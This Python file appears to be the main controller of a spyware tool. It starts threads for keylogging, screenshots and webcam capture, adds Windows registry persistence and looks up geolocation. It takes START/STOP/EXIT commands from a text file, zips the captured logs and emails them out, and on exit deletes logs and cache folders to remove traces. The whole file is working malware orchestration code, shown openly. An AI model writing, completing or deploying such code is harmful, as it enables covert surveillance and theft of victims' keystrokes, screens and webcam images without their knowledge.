# Required imports
import threading
import time
import os
import shutil

# Importing all submodules from core and the email sender function
from core import persistence, geolocation, logger, screenshot, webcam
from send.mailer import send_email

# Shared state to manage the logger's active status across threads
active_state = {"value": False}

# Flag to ensure threads are only started once
threads_started = False

def cleanup():
    """Remove log files, zip archive, and __pycache__ directories."""
    for item in [".logs", "logs_encrypted.zip"]:
        if os.path.exists(item):
            if os.path.isdir(item):  # If it’s a directory, remove it completely
                shutil.rmtree(item)
            else:  # If it’s a file (zip), remove the file
                os.remove(item)

    # Remove all __pycache__ folders recursively from the project directory
    for root, dirs, _ in os.walk("."):
        for d in dirs:
            if d == "__pycache__":
                shutil.rmtree(os.path.join(root, d))
                print(f"[+] Removed: {os.path.join(root, d)}")
    
    print("[+] Cleanup complete.")

def command_loop():
    """
    Continuously read commands from 'command.txt' file.
    Available commands:
    - START: Start all payloads.
    - STOP: Stop all payloads and send data via email.
    - EXIT: Clean up and terminate the script.
    """
    global threads_started
    while True:
        try:
            with open("command.txt") as f:
                cmd = f.read().strip().upper()  # Convert to uppercase for consistent checks

            # START: Trigger all capture modules
            if cmd == "START" and not active_state["value"]:
                print("[*] START command received. Executing payloads.")
                active_state["value"] = True  # Let all threads know they're active
                if not threads_started:
                    start_threads()
                    threads_started = True  # Prevent restarting threads again

            # STOP: Pause capturing and send collected logs via email
            elif cmd == "STOP" and active_state["value"]:
                print("[*] STOP command received. Halting payloads and sending email.")
                active_state["value"] = False  # Signal all threads to stop
                time.sleep(2)  # Give threads a moment to finish
                zip_and_send_logs()

            # EXIT: Cleanup and terminate the program
            elif cmd == "EXIT":
                print("[!] EXIT command received. Cleaning up and exiting...")
                cleanup()
                break  # Exit loop and terminate script

            time.sleep(2)  # Polling delay

        except FileNotFoundError:
            # If 'command.txt' doesn't exist yet, wait and retry
            time.sleep(2)

def start_threads():
    """Start all required threads and setup registry persistence."""
    # Add registry key for persistence (Windows-specific)
    persistence.add_to_registry()

    # Get geolocation once (not in a thread)
    geolocation.get_geolocation()

    # Launch each payload in its own thread (so they run in parallel)
    threading.Thread(target=logger.start_logger, args=(active_state,), daemon=True).start()
    threading.Thread(target=screenshot.screenshot_loop, args=(active_state,), daemon=True).start()
    threading.Thread(target=webcam.webcam_loop, args=(active_state,), daemon=True).start()

def zip_and_send_logs():
    """Compress logs directory and email the encrypted zip archive."""
    if os.path.exists(".logs"):
        archive_name = "logs_encrypted"
        shutil.make_archive(archive_name, "zip", ".logs")  # Create logs_encrypted.zip
        print("[+] Logs zipped. Sending via email...")
        send_email()  # Call mailer module to send the file
    else:
        print("[-] No logs found to zip.")

# Entry point for the program
if __name__ == "__main__":
    print("[*] Waiting for command in command.txt...")
    command_loop()
